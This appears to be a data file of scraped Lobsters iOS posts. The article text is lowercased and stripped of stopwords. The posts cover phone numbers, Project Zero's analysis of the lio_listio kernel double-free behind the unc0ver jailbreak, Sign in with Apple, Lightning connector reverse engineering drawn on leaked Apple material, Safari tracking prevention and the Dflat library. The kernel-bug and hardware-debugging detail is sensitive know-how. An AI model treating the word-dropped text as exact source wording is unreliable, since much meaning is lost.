38,Lobsters,ios,Apple iOS,Dealing with phone numbers in contact book,https://ashishb.net/tech/dealing-with-phone-numbers-in-contact-book/,dealing phone number contact book,telephone country code prefixfree telephone number multiple representation std call multiple country share telephone code continuous area code country code always adjacent confirming phone number ownership like post navigation,building app us user contact book certain gotchas avoid telephone country code prefixfree country country code country get country code like scheme ensures number inherently unambiguous telephone number multiple representation since people dial internationally telecom system implicitly assume domestic call someone dialing u dialing person india dialing since international dialing would infrequent telecom require unique prefix number like distinguish whether someone country austria state even domestic area code explicitly required user might stored phone number telecom implicitly prefix user area code user want dial beyond area telecom operator would require additional prefix mark std call localization massive implication regarding processing cleaning normalizing phone number retrieved user contact book country code area code contain usually superfluous telecom might ok calling sending sm treat number like incorrect multiple country share telephone code usa canada many country caribbean share telephony code carrier would treat call sm international though italy vatican city share continuous area code country code always adjacent population grows certain area others code reserved region get allotted example san francisco bay area first allocated top existing area code deal growing population confirming phone number ownership never trust incoming call incoming sm phone number therefore way verify user owns phone number sending text message making phone call like like loading post navigation
39,Lobsters,ios,Apple iOS,How to unc0ver a 0-day in 4 hours or less,https://googleprojectzero.blogspot.com/2020/07/how-to-unc0ver-0-day-in-4-hours-or-less.html,hour le,,brandon azad project zero pm pdt may jailbreak released io latest signed version time release using zeroday vulnerability heavy obfuscation pm identified vulnerability informed apple sent apple poc analysis post take along journey initial identification wanted find vulnerability used report apple quickly order demonstrate obfuscating exploit little prevent bug winding hand bad actor downloading extracting ipa loaded main executable ida take look unfortunately binary heavily obfuscated finding bug statically beyond ability next loaded app onto ipod touch running io try running exploit exploring app interface nt suggest user sort control vulnerability used exploit device hoped support one use oobtimestamp bug instead io lower clicking jailbreak button thought occurred written kernel exploit understood memorycorruptionbased exploit something critical section kernel state corrupted system would unstable rest exploit continue whim double clicked home button bring app switcher killed app device immediately panicked panic cpu caller zone cache element used free element corrupted beginning expected found canary zone debugger message panic memory id o version kernel version darwin kernel version wed oct pdt root kernelcache uuid kernel uuid iboot version secure boot yes paniclog version kernel slide kernel text base machabsolutetime epoch time sec usec boot sleep wake calendar panicked task page thread pid panicked thread backtrace tid lr fp lr fp lr fp lr fp lr fp lr fp lr fp lr fp lr fp lr fp lr fp lr fp lr fp lr fp lr fp lr fp seemed promising panic message saying useafterfree allocation zone general purpose allocation size byte however possible symptom memory corruption rather source memory corruption even decoy investigate need analyze backtrace waiting ida process ipod kernelcache tried offthecuff experiment since many exploit use mach port fundamental primitive wrote app would churn ipcports zone creating fragmentation mixing freelist ran app afterwards exploit still worked suggesting may rely heap grooming mach port allocation next since panic log mentioned decided write app would continuously allocate free background exploit idea relies reallocating allocation app might grab slot instead would likely cause exploit strategy fail possibly result kernel panic sure enough app hammering background touching jailbreak button caused immediate kernel panic sanity check tried changing app hammer different zone instead time exploit ran successfully suggesting indeed critical allocation zone used exploit finally ida finished analyzing ipod kernelcache started symbolicating stacktraces collected panic log panicked task page thread pid panicked thread backtrace tid lr lr lr lr lr lr lr panic lr zcacheallocfromcpucache lr zallocinternal lr kalloccanblock lr aiocopyinlist lr liolistio lr unixsyscall lr slehsynchronous lr flehsynchronous lr call liolistio immediately stood long finished writing survey recent io kernel exploit happened remember liolistio vulnerable syscall used lightspeedbased exploit reread blog post synacktiv get sense bug immediately another piece fell place target object doublefreed lightspeed race aioliocontext object life also large number thread app supported idea race condition point felt enough evidence reach apple preliminary analysis suggesting bug lightspeed either variant regression confirmation poc next wanted confirm bug writing poc trigger issue tried original poc shown lightspeed blog post minute running nt yet panicked suggested perhaps variant original lightspeed bug find started two line investigation looking xnu source try spot bug using patch liolistio kernelcache running exploit source could nt see original vulnerability fixed nt make sense instead focused effort kernel patching booting patched kernelcache tricky doable downloaded booted ipod pongoos shell using example pongoos repo guide created loadable pongo module would disable kernel patch instead apply patch disabled kernel patch worried would detect engage antianalysis measure first test insert invalid instruction opcodes liolistio function would panic called surprisingly device booted fine clicked jailbreak panicked meant process calling liolistio next patched code responsible allocating aioliocontext object doublefreed original lightspeed bug would allocated instead mov patched str sp alloc size adrl add sp mov block bl kalloccanblock cbz mov liocontext mov sizet bl bzero idea increasing object allocation size cause exploit strategy fail try replace accidentallyfreed context object replacement object simply occur sure enough patch place stalled exploiting kernel step without actually panicking ran experiment patching various point function dump argument data buffer passed liolistio could compare value used original lightspeed poc idea noticed substantial difference would point direction variant source however field aioreqprio set gang difference argument passed liolistio original poc point looked like might actually original lightspeed bug variant returned original poc see perhaps reason nt triggering specific technique used mitigated code responsible reallocating allocation caught eye mandatory used make race likely poll force struct pollcontinueargs second dword collide liocontext ioissued technique quite slow waiting time better way exists int n poll null nt ever seen poll used reallocation primitive intuitively felt like using mach port based reallocation strategy promising replaced code outofline mach port spray copied oobtimestamp sure enough change required make poc trigger reliably second patch history working poc retried original lightspeed poc found would eventually panic left run long enough thus another case reintroduced bug could identified simple regression test let return source see figure happened mentioned earlier first checked xnu source see liolistio patch might broken actually could nt identify bug originally patched retrospect nt far original lightspeed blog post describes vulnerability well wo nt rehash highly recommend reading post high level bug semantics function free aioliocontext object unclear worker thread perform asynchronous io liolistio function could mentioned post original fix bug free aioliocontext object case might doublefreed one hand patch fix potential uaf liocontext hand error case handled fix ignored result possible make liolistio allocate aioliocontext never freed kernel give u silly do also crash recent kernel io included rest see future apple bother fix little do introduced patch turn apple eventually decide fix memory leak io appears reintroduced race condition doublefree case lionowait io issued must free rdar liocontext ioissued freecontext true break code io nt exactly io semantically equivalent anyone remembered understood original lightspeed bug could easily identified regression reviewing xnu source diffs anyone ran relatively simple regression test would found issue trivially summarize lightspeed bug fixed io patch nt address root cause instead turned race condition doublefree memory leak io memory leak identified bug fixed reintroducing original bug without addressing root cause issue security regression could found trivially running original poc blog post read regression followup post synacktiv blog conclusion combination sockpuppet regression io lightspeed regression io strongly suggests apple run effective regression test least old security bug public bug got lot attention running effective regression test necessity basic software testing common starting point exploitation still happy apple patched issue timely manner exploit became public reality attacker figure issue quickly long public poc released thus window opportunity exploit regression substantial also goal trying identify bug used demonstrate obfuscation block attacker quickly weaponizing exploited vulnerability turned lucky analysis experience writing kernel exploit let quickly figure alternative strategy find bug happened already familiar specific vulnerability used keeping track past exploit anyone business using exploit apple user would also advantage
40,Lobsters,ios,Apple iOS,Why AnyList Won‚Äôt Be Supporting Sign In with Apple,https://blog.anylist.com/2020/06/sign-in-with-apple,anylist supporting sign apple,enforcing new rule hide email privacy fundamental human right never massive security flaw like apple recent developer documentation explicitly state usage guideline facebook login recently caused huge number io apps crash contact u,starting june apple enforcing new rule app store requiring many apps support sign apple anylist one apps affected new rule mean must either implement sign apple make change app considering merit sign apple decided support understand may surprise customer like explain detail made decision thirdparty login system like sign apple cause many user experience customer support headache people remember login system used create account hmm created account couple year ago use email address facebook account sign apple simple question like reset password longer simple answer depend system used create account remember get locked account used thirdparty login system may able help instead direct another company hassle entail addition customer experience problem common thirdparty login system sign apple introduces several unique one problem apple id tied icloud email address account created via sign apple use icloud email address many icloud email address unused unchecked customer real email account gmail yahoo hotmail account try contact customer using icloud email address may never see message used run problem constantly customer support back anylist used builtin io email compose interface sending support request interface often default using icloud email account people would ask help reply contact u later angry never replied reply going icloud email account see ever looked gmail account gmail app another issue sign apple hide email feature feature create account u apple generate special email address account rather email address johndoe icloudcom see email address something like privaterelayappleidcom intriguing idea provides measure privacy practice creates numerous support user experience headache customer contact u asking support need look something account typically ask email address account hide email easily possible customer would figure privaterelayappleidcom email address used account furthermore platform anylist support sign apple like android someone want log account know privaterelayappleidcom email address certainly easy find longer io device create password u since able sign using sign apple finally service like anylist heavily focused sharing list people hide email option greatly complicates collaboration typically customer share list typing email address person want share person already account list instantly shared hide email option spouse friend obviously know privaterelayappleidcom email address enter email address system believe account point get email u asking create account accidentally create new account include work done existing account created via sign apple manage make mistake would link email address account created sign apple negating value hiding email address agree apple privacy fundamental human right understand hide email option sign apple wellintentioned feel like apple really think implication basic user experience customer support collaboration anylist respect privacy small company make money people like app pay make money creepy tracking selling information provide u email address never sold shared used invade privacy beyond customer experience also many problem sign apple creates u developer knockon effect customer first implementing support thirdparty login system like sign apple significantly increase complexity handling user account system instead one system common operation like creating account signing supporting thirdparty login system quickly turn account management code rat nest special logic necessary handle different login system especially true supporting multiple thirdparty login system eg facebook login google signin sign twitter etc make maintenance difficult errorprone place afford error securitycritical code like account management also time consuming implement support new thirdparty login system particularly small company like support app multiple platform enough u add sign apple io app also add web app mac app android app creating even complexity apple provide real solution supporting sign apple android see choose support sign apple mean spend significant amount time get working everywhere rather spending time improving core list recipe meal planning functionality app developer always duediligence evaluating security implication work last month massive security flaw reported sign apple serious apple paid person found read linked report see serious flaw also simple provide lot confidence something critical service logging account seem wise use immature service le year old recently subject serious security flaw another sign sign apple immaturity sad state documentation good documentation critical facilitating developer adoption service since apple expecting developer adopt service june seems reasonable expect decent documentation sadly like apple recent developer documentation sorely lacking example apple vaguely state implement sign apple android direct documentation understand apple probably care much android going provide login system going force developer multiplatform apps adopt providing real support major platform multiplatform apps run acceptable finally policy perspective apple explicitly state usage guideline apple reserve right disable sign apple website app reason time customer log account use service giving thirdparty powerful control core part service absolutely required unnecessarily risky view facebook login juncture may thinking point use anylist offer let sign facebook suffer many similar problem anyway new app store review guideline require support sign apple since offer facebook sign option excellent point absolutely true argument apply creating account via facebook also announcing removing facebook login anylist support signing using facebook begrudgingly added year ago experiment offering another signup option never enthusiastic become even true time go since facebook constantly seems upping ante creepy privacy practice use facebook sdk provide login functionality every new release sdk seems add new tracking option turned default take action disable furthermore facebook sdk quality problem recently caused huge number io apps crash due misconfigured server expect see anylist app update soon remove facebook login hope post helped explain supporting sign apple love hear feedback post comment question please contact u get back want informed new post available sign notified via email infrequent update spam
41,Lobsters,ios,Apple iOS,"An iOS, iPadOS, and macOS application reference manual for ARM assembly instructions",https://github.com/evilpenguin/ARMRef,io ipados macos application reference manual arm assembly instruction,join github today sign file permalink topic resource license reload reload,arm assembly reference manual io ipados macos dismiss join github today github home million developer working together host review code manage project build software together sign file permalink failed load latest commit information type name latest commit message commit time arm assembly reference manual io ipados macos topic resource license perform action time signed another tab window reload refresh session signed another tab window reload refresh session
42,Lobsters,ios,Apple iOS,Apple Lightning,https://nyansatan.github.io/lightning/,apple lightning,apple lightning lightning tristar hydra source hifive sdq idbus onewire protocol play interpreting idbus request response spbdimka hostid wake power handshake word esn tristar interface provisioning ezlink tristar tristar electric characteristic credit,apple lightning created little article almost everything know apple lightning related technology tristar hydra hifive sdq idbus etc first tiny warning read article risk information artcile based lot appleinternal material leaked datasheets schematic source code read diagonal direction course research warn reader never done research thus writeup might use incorrect weird term turn partially completely wrong going deeper let briefly sort term lightning lightning digital interface used apple io device since late replaced old connector see female port pinout picture connector pinout picture please pay attention fact connector pin side connector nt wired exact order thus host device detect orientation cable anything else though always applicable many lightning accessory played mirrored pinouts connector tristar hydra tristar integrated circuit embedded every device shipped lightning female port basically mux among many thing main purpose communicate lightning male connector one connected detect orientation detect accessory id route internal interface like usb uart swd accordingly hydra new variant tristar used since iphone significant change appears support wireless charging verified major tristarhydra variant known ti firstgen tristar used ipad mini ipad nxp firstgen tristar used iphone ipod touch nxp mysterious firstgen tristar used ipod nano source nxp secondgen tristar used since iphone apparently everything else nt support wireless charging multiple generation one x number generation nxp hydra used since iphone apparently everything else support wireless charging x number generation use term tristar keep mind also mean hydra well similar aspect gon na covered text hifive hifive lightning slave ie male connector contains logical element well chip known sdq idbus term often referred kind synonym convinience use term idbus seems correct technology called datasheet idbus digital protocol used negotiation tristar hifive similar onewire protocol play let sniff negotiation tristar hifive take logic analyzer lightning maletofemale passthrough breakout board accessory normal lightning usb cable would fit fine course device lightning port first connect logic analyzer channel id line breakout pin connect breakout device connect accessory yet right start sampling rate mhz fine see something like see tristar poll id line rotation one another since nt connect accessory polling obviously fails point device grow tired endless stream failure stop meanwhile let examine exactly happens polling first see long interval millisecond level high nothing else happening apparently time used charge internal hifive capacitor energy used powerup internal logic chip happens next far interesting obviously data flowing interpret decode let virtually split almost least least significant part something call word basically word combination fallrisefall meaningful stage time interval taken stage defines meaning word recovery stage time interval apparently required processing meaningful stage recieving side andor preparing next word sending stage table known word type time interval stage discussed unit microsecond meaningful recovery word min typ max min typ break wake zero one zero stop one stop stop used last bit byte using table build simple decoder protocol see first word host sends break tristar want send new request always start come data stage please pay attention fact last bit byte longer recovery stage data stage host sends another break slave must send reply least u delay see table tristar wait around m reply issued time interval tristar try poll another id line let examine data stage example requestresponse type always even request always odd response request type actual data empty request type byte whole data polynomial initial value let connect accessory setup see happens use apple original lightning usb cable appears idbus request hifive replied scroll see lot requestresponse pair request need response though interpreting idbus request response important idbus request used two purpose tell hifive enable full current case supported accessory ask pin configuration cable support metadata much known response data encoded bit available certain old tristar datasheet first byte response data accx dx data accx configuration id found accx hostreset hiz idbus hiz hiz hiz jtagdio jtagclk hiz hiz hiz high accx configuration id found accx hostreset hiz hiz idbus hiz hiz jtagdio jtagclk hiz hiz hiz high dx configuration id found dx hiz hiz hiz hiz hiz hiz hiz hiz hiz hiz dx configuration id found dx hiz hiz hiz hiz hiz hiz hiz hiz hiz hiz using table let decode cable id keeping mind id line found pin first byte cable response data accx dx data h accx meaning pin stick idbus dx meaning pin configured expected standard usb cable let sniff something interesting accessory id hostid dcsd kongswd astris running kongswd astris running kanziswd astris running kanziswd astris running haywire hdmi uart charge lightning mmearpods lightning full list idbus request provided spbdimka tip easily get accessory property including id using accctl apple internal utility shipped nonuiinternalui build easily run jailbroken device tip easily get cable pin configuration diags tristar p please note command available io diags tip easily track requestsresponses generated swdprobes setting debug env var astrisctl setenv debug cable virtual com see something like hostid one table could see mention thing called hostid value carried request appears might affect response hifive reply least set invalid value yes possible diags hifive might stop working though environmental variable called disableidcheck kongswdkanziswd firmware set make probe ignore invalid hostid important note kong kanzi feature hifive dedicated unreprogrammable chip instead accessory emulate using microcontroller andor fpga unit thus easily updatablereprogrammable wake table accessory id could see could notice kong kanzi send different response depending whether astris appleinternal software designed debugging swdprobes launched decode response using table find astris launched probe act like dcsd usb debug uart line debugging software running accid line switched swd want launch astris probe already connected device cable switch acc line swd wake break game hifive device emulates initiate wake idbus enumeration process start tristar send request kongkanzi reply new id tristar acknowledge route acc line internal swd line soc must development fusing demoted swd actually work course power handshake last thing going cover chapter power handshake algorithm based idbus requestsresponses kernel tristar driver use allowing charging accessory lightning cable lying somewhere connected chargercomputer connected device hifive limit current pwr really small value around according measurement enable full current request must issued tristar processed hifive secureromiboot enough kernel booted additional step made tristar issue request soon second one processed hifive reply sent disables current around millisecond time elapsed tristar issue another request data hifive process reply point kernel driver responsible tristar allow charging important note part know least one part mostly reversed thus careful information word esn tristar interface another feature tristar like tell esn esn little blob tristar store eeprom later retrieved idbus using serial number reader cable kanzi basically thing except different usb pid little bit different enclosure simple word sending blob ttrsapplecom get device serial number mechanism used apple storeapple premium reseller staff retrieve sn dead device considering tristar still alive though thing happening idbus retrieving esn already documented spbdimka provisioning procedure flashing esn tristar called provisioning provisioning done using diags device side using ezlink host side take step check provisioning status using diags tristar provstat retrieve esn well tristar esn way diags generally rich set tristar command available since io tristar tristar available address writing reading diags kernel driver communicate much publicly known register lot information register map obtained leaked iboot source code appears backwards compatible much write achieve interesting result another source knowledge diags tristar module easily extractable swd running example manage reverse algorithm reading provisioning state esn implemented addition iboot payload lina tried reverse esn writing algorithm well failed mechanism complex skill code snippet lina though available tristar electric characteristic tristar powered source line used idbus according oscilloscope better try interact idbus device like certain model arduino without level shifter credit spbdimka
43,Lobsters,ios,Apple iOS,No - Safari 14 Does Not Block Google Analytics,https://www.simoahava.com/analytics/no-safari-does-not-block-google-analytics/,safari block google analytics,safari block google analytics loading running website worldwide developer conference version privacy report crosssite tracker tracker prevented apple insider search engine journal myth debunked safari block resource load intelligent tracking prevention maciek stanasiuk tom anthony block prevents tracker cooky crosssite request thirdparty cooky privacy report work privacy report duckduckgo known google analytics firstparty analytics platform set final thought block prevent tracker devastating impact limit,let start proclaiming clarity sincerity safari version safari block google analytics loading running website midst apple yearly worldwide developer conference company showcased privacy improvement upcoming version safari web browser version fact biggest revelation new privacy report designed elucidate much browser working towards mitigating damage caused crosssite tracker better worse one preview showed googleanalyticscom listed among tracker prevented website queue panic spread misinformation like wildfire dry brush firstparty analytics apple insider quick report going far say browser completely block google search engine journal picked story saying specifically show google analytics blocked safari note search engine journal added footnote might got story wrong myth debunked safari block resource load intelligent tracking prevention itp work elegant john wilander webkit engineer charge itp saying itp started block resource load itp much block cooky early maciek stanasiuk tested whether hit actually blocked found opposite similarly tom anthony contributed research safari say block prevents tracker mean itp algorithm flagged domain crosssite tracking capability safari among thing stripped capability carry cooky crosssite request also known thirdparty cooky safari mean prevented known tracker googleanalyticscom domain flagged crosssite tracking domain safari assigns certain protective measure communication domain read prove point site googleanalyticscom googletagmanagercom flagged tracking domain still merrily loading javascript library sending http request designated endpoint privacy report work intelligent tracking prevention flag domain potential tracking domain detects request sent browser sufficient number unique domain safari browser sends request googleanalyticscom safari flag googleanalyticscom crosssite tracking capability itp hundred upon hundred domain regular safari user since introduction safari slowly close noose around crosssite tracker privacy report designed shed light process however instead listing domain flagged itp domain crossreferenced duckduckgo tracker list match found domain surfaced privacy report showcase itp blocking known tracker reading data really fact googleanalyticscom ability leverage thirdparty storage neutered mean nothing tool actually used google analytics firstparty analytics platform downloaded google server javascript library identifier stored firstparty cooky http request ga endpoint use identifier identifier alone specify source tracker thirdparty storage access used request googleanalyticscom mean might cooky set googleanalyticscom would imagine used debugging monitoring purpose example cooky would work safari browser target googleanalyticscom tracking domain final thought disappointed many thing right disappointed bit misinformation spread fast reputable journal took grainy screenshot couple influencer tweet jumped conclusion quoted social medium disappointed privacy report clumsy wording use term like block prevent tracker lead confusion aftermath wwdc showed unless clearly defined report know final version privacy report yet hopefully copy clarified disappointed took whole day install big sur macos beta external drive test something already knew true yes disappointed enough disk space available install big sur proper hard disk partition disappointed privacy report intelligent tracking prevention amazing job protecting safari user something devastating impact mishandled itp keep evolving morphing adjust crosssite tracking crowd google analytics user need worry safari google analytics require crosssite tracking capability safari block use naturally limit effective another story huge thanks folk like maciec stanasiuk tom anthony charles farina working rumor mill
44,Lobsters,ios,Apple iOS,Local area network push notifications,https://thomask.sdf.org/blog/2020/07/01/local-area-network-push-notifications.html,local area network push notification,apns year ago matrix certain video problem,theory push notification policy weirdly significant effect open source software architecture successful project challenging freeasinbeer decentralised model io chat app want monitor server realtime update prevented holding tcp connection open background also prevented polling update consistency reliable way get realtime update apns internetbased apple service person trigger update creator app architecture mean different people responsible client app server containing data creates range undesirable consequence find satisfactory solution effectively locked io market discussed detail year ago context matrix work around way long small double take spotted certain video claim io notification application server device network without internet hold mean apns picture selfhosted way deliver reliable push notification carte blanche every xmpp fediverse server implement push notification side way catch course catch main limitation work connected wifi network cell internet back apns able specify code list network ssids local push notification active perhaps thinking could fill information dynamically well maybe getting currently connected ssid problem say repeatedly video targeted specific use case messaging apps cruise ship particular context restriction make sense enough wiggle room solve problem much surprise much freedom app extension get tested beta appears get run whole time ssid implement whatever protocol want talk proprietary server pretty significant carveout protection apps draining battery requires entitlement assume flag special attention app store otherwise could imagine nefarious app already location access using cncopycurrentnetworkinfo together new feature track whenever user home work etc without actively using location permission possible decentralised project find niche us service selfhosted home lan could absolutely build client give push notification home however app let type ssid nothing say pas app store review unless happen live cruise ship
45,Lobsters,ios,Apple iOS,"Dflat, Structured Data Store for Mobile",https://github.com/liuliu/dflat,dflat structured data store mobile,dflat sqlite flatbuffers core data realm dflat dflat dflat feature dflat core data dflat dflat strict serializable core data dflat combine second introduction dflat flatbuffers schema dflat dflat libmdbx dflat dflat installation dflat bazel dflat swift package manager guide dflat example combine combine schema evolution dflat dflat namespace dflat dflat runtime api dflat transaction dflat dflat data fetching dflat data subscription combine close dflat dflat benchmark dflat dflat dflat wcdb disclaimer crud dflat dflat dflat dflat dflat dflat dflat change subscription dflat dflat dflat dflat sqliteswift dflat,dflat sqlite flatbuffers familiar core data realm dflat occupies space two application unlike two dflat different set feature make different tradeoff feature tradeoff grounded realworld experience writing world largest apps dflat also built groundup using swift hopefully find natural interact swift language feature writing different structured data persistence system mobile past year dflat accumulation lessonslearned building proprietary system io particular goto choice long core data work internal data persistence mechanism many system apps deploying structured data persistence system hundred million mobile device certain challenge intrinsics data persisted higherlevel rest app interact system dflat codebase still young stage however underlying principle proving successful proprietary system dflat implemented following feature particular order system return immutable data object passed system view model generator query object observed update published either callback combine framework mutation happen separate thread caller little control thus asynchronously data fetching happen concurrently synchronously thread caller choice strict serializable multiwriter multireader mode supported user choose singlewriter thus trivially strict serializable multireader mode desire data query expressed swift code typechecked swift compiler schema upgrade require writeaccess underlying database strict readonly possible sqlite unlike core data dflat built groundup swift express data model taking full advantage swift language thus native support struct producttype enum sumtype typechecked query observing combine second introduction dflat consists two part dflatc compiler take flatbuffers schema generate swift code dflat runtime minimal api footprint interact dflat runtime us sqlite storage backend design support backends libmdbx future hard dependency flatbuffers use dflat first use dflatc compiler generate data model flatbuffers schema include generated code project use dflat runtime interact data model installation dflat moment requires bazel precise dflat runtime installed either swift package manager bazel dflatc compiler requires bazel build relevant part install bazel macos following guide use dflatc compiler dflatcpy help proceed add dflat runtime either swift package manager bazel swift package manager package name dflat url http githubcomliuliudflatgit example assuming postfbs file somewhere look like enum color byte red green blue table textcontent text string table imagecontent image string union content textcontent imagecontent table post title string primary primary key color color tag string priority int indexed property indexed content content roottype post important say post object one dflat manages use dflatc compiler generate code schema dflatcpy postexample postexamplepostfbs everything check see file generated postexample directory postgeneratedswift postdatamodelgeneratedswift postmutatinggeneratedswift postquerygeneratedswift adding project basic createreadupdatedelete crud operation post object import dflat import sqlitedflat let dflat sqliteworkspace filepath filepath fileprotectionlevel noprotection create var createdpost post nil dflatperformchanges postself changeshandler txncontext let creationrequest postchangerequestcreationrequest creationrequesttitle first post creationrequestcolor red creationrequestcontent textcontent textcontent text first post guard let inserted try txncontentsubmit creationrequest else return alternatively use txncontenttry submit creationrequest wo nt return result reasonable error handling case let inserted post inserted createdpost post succeed transaction done read let post dflatfetch postself posttitle first post update dflatperformchanges postself changeshandler txncontext let post post let changerequest postchangerequestchangerequest post changerequestcolor green txncontenttry submit changerequest succeed transaction done delete dflatperformchanges postself changeshandler txncontext let post post let deletionrequest postchangerequestdeletionrequest post txncontenttry submit deletionrequest succeed transaction done subscribe change either query object object subscription end object deleted query subscription wo nt complete unless cancelled two set apis one vanilla callbackbased based combine show combine one subscribe live query let cancellable dflatpublisher postself postcolor red orderby postprioritydescending subscribe dispatchqueueglobal sink post print post subscribe object let cancellable dflatpulisher post subscribe dispatchqueueglobal sink post switch post case updated newpost print newpost case deleted print deleted completed schema evolution schema evolution dflat follows exact flatbuffers exception add primary key change primary key different property selected otherwise free add remove index rename property property removed marked deprecated new property appended end table never change type property need versioning long follow schema evolution path schema maintained flatbuffers sqlite disk ops required schema upgrade schema upgrade failure due lack disk space prolonged schema upgrade time due pathological case wo nt thing dflat namespace dflat schema support namespace flatbuffers schema however swift nt really support proper namespace namespace implementation relies public enum extension thus namespace namespace table post title string primary roottype post declare namespace project need swift file contains following public enum evolution public enum work access post object typealias post dflat runtime api dflat runtime minimal api footprint apis total object transaction func workspaceperformchanges transactionalobjecttypes anytype changeshandler escaping transactioncontext transactioncontext void completionhandler success bool void nil api take changeshandler closure perform transaction object creation update deletion mutation performed changerequest object first parameter specifies relevant object going transact read update object specified assertion triggered transaction done completionhandler closure triggered let know whether transaction successful transaction performed background thread exactly one nt concern two different object transaction performed concurrently follows strict serializable protocol case func transactioncontextsubmit changerequest changerequest throw updatedobject func transactioncontexttry submit changerequest updatedobject func transactioncontextabort bool interact dflat apis transaction handle data mutation submit note error possible example created object primary key twice use upsertrequest expected try submit method simplified try submit dance case nt want know returned value fatal conflict primary key otherwise swallow type error disk full encountered type error dflat simply fail whole transaction abort method explicitly abort transaction submission call effect data fetching func workspacefetch oftype elementtype elementquery limit nolimit orderby fetchedresult element func workspacefetch oftype elementtype limit nolimit orderby fetchedresult element func workspacefetchwithinasnapshot data fetching happens synchronously specify condition clause posttitle first post postpriority postcolor red returned fetchedresult element act pretty much like array object element immutable thus either object fetchedresult element safe pas around thread fetchwithinasnapshot provides consistent view going fetch multiple object let result dflatfetchwithinasnapshot firstpost fetchedresult post highpriposts fetchedresult post let firstpost dflatfetch postself posttitle first post let highpriposts dflatfetch postself postpriority postcolor red return firstpost highpriposts needed dflat transaction fetch firstpost highpriposts fetchwithinasnapshot wo nt stop transaction make sure observe view fetching firstpost data subscription func workspacesubscribe element equatable fetchedresult fetchedresult element changehandler escaping fetchedresult element void subscription func workspacesubscribe element equatable object element changehandler escaping subscribedobject element void subscription native subscription apis subscribes change either fetchedresult object object end object deleted subscription triggered completionhandler transaction triggered func workspacepublisher element equatable element atompublisher element func workspacepublisher element equatable fetchedresult element fetchedresultpublisher element func workspacepublisher element equatable elementtype elementquery limit nolimit orderby querypublisher element func workspacepublisher element equatable elementtype limit nolimit orderby querypublisher element combine counterpart besides subscribing object fetchedresult also subscribe query directly happens hood query made upon subscribe hence whichever queue provided subscribe subscribe fetchedresult close func workspaceshutdown completion void nil trigger dflat shutdown transaction made dflat call fail transaction initiated finish normally data fetching return empty result data fetching triggered call finish normally hence completion part completion closure supplied called transaction data fetching initiated shutdown finish benchmark benchmark structured data persistence system notoriously hard dflat wo nt claim fastest however strives predictable performant mean nt pathological case performance dflat degrades unexpectedly also mean dflat wo nt surprisingly fast optimal case following data collected reproduced focuspy app benchmark compared mainly core data listed number fmdb wcdb wcdb benchmark give better overview would expect test device test device iphone pro memory disclaimer take grain salt benchmark number number presented simply demonstrate pathological case framework involved nt taken context practice structured data persistence system rarely bottleneck important understand use rather raw number lightworkload device look like code app benchmark compiled release mode compilationmodeopt wholemoduleoptimization wcdb benchmark compiled release mode whatever mean project file benchmark peerreviewed case represents best case scenario framework case represents worst case scenario designed reflect realworld workload rather benchmark designed reflect framework characteristic extreme case crud first compared dflat core data object insertion fetching update deletion object generated index title indexed core data fetching object evaluated framework querying nonindexed property update object individually evaluated updating different object separate transaction time fetching object individually evaluated fetching different object title indexed core data primary key dflat time obviously best way thing update object one big transaction fetch batch possible interesting pathological case discussed earlier proper way multithread insertion deletion core data considerably tricky nt got around multithread insert object multithread delete object dflat number look good true example insertion dflat appears twice fast core data number nt make intuitive sense multithread insertion slower putting perspective important chart compared number extracted wcdb benchmark without modification compare ops per second rather time spent fetching object note wcdb benchmark baseline read fetch best case scenario sqlite also compare simple table two column key blob payload byte multithread writes indeed slower ideal case sqlite execute writes concurrently thus multiwriter mode really mean transaction closure executed concurrently writes still happen serially sqlite layer still beneficial realworld case spend significant time transaction closure data transformation rather sqlite writes ceiling writes much higher dflat achieved wcdb represents ideal case two column dflat number realworld would also lower index object many field even array data since dflat nt introduce optimization batch operation nt surprise dflat performance scale linearly wrt dataset size follow chart show change subscription every framework slightly different design change subscription work core data implement two way nsfetchedresultscontroller delegate callback nsmanagedobjectcontextobjectsdidchange developer perspective nsfetchedresultscontroller interpreted counterpart fetchedresult subscription dflat side support making sqllike query sending update result set build dflat object subscription mechanism core data based nsmanagedobjectcontextobjectsdidchange notification purpose objective simply observe latency nsmanagedobjectcontextobjectsdidchange notification compare two assuming underlying delivery individual object subscription noop three part benchmark subscribe change fetched result observe exactly one object fetched primary key subsequent transaction update object including subscribed object measuring latency saved time update delivered core data child context viewcontext set latency measured saving child context time delivered data persisted viewcontextsave called child context saved dflat side happens data persisted subscribe change fetched object subsequent transaction update object including subscribed object measuring latency saved time update delivered core data nsmanagedobjectcontextobjectsdidchange subscribed viewcontext object measure latency saving child context time notification delivered subscribe change fetched result observe around object fetched range query subsequent transaction update object rotate object fetched result maintaining object per result measurement setup core data number fetched result observation especially case represents pathological case particularly troublesome dflat fetching object disk individually would take around millisecond thus would take sqliteswift approach identifying whcih table changed simply refetch every query table could end performant although case refetching disk would definitely slower close second query object benchmark core data suffered similar problem worse extreme case mobile apps handful query subscription probably thousand object query unsubscribe change navigate away page extreme case hardly realistic going see stutter core data object updated happen table view need updated reality subscribe individual query primary key seems big nono want observe individual object subscribe individual object case show however expose messagesortinganddelivery mechanism working efficiently expected fundamentally dflat change subscription work best incremental change evaluate every changed object fetched request subscription related object design avoids trip disk every transaction also relies reasonable implementation evaluate every changed object efficiently quick test show looping object string equality evaluation swift take millisecond profile show majority time spent object retain release function call swift runtime two way improve current evaluation relies swift protocol associated type seems certain swift usage higher runtime cost others switching better linear scan either interpreted vm simply optimizing evaluation procedure would probably show improvement algorithmically improved current implementation naive way evaluate object subscribed query study database implementation know accelerated data structure helpful particularly fieldexpr query used build sorted set comparable query accelerated sorted set quite doable challenge need wrestling swift runtime behavior erratic time obvious gain possible intended delegate part c make harder hard implement use logic internally support isnull isnotnull query mean every turn need sort unknown robust correct implementation mean much unit test feel comfortable also need balance linear scan use accelerated data structure small number change linear scan could faster previous empirical study
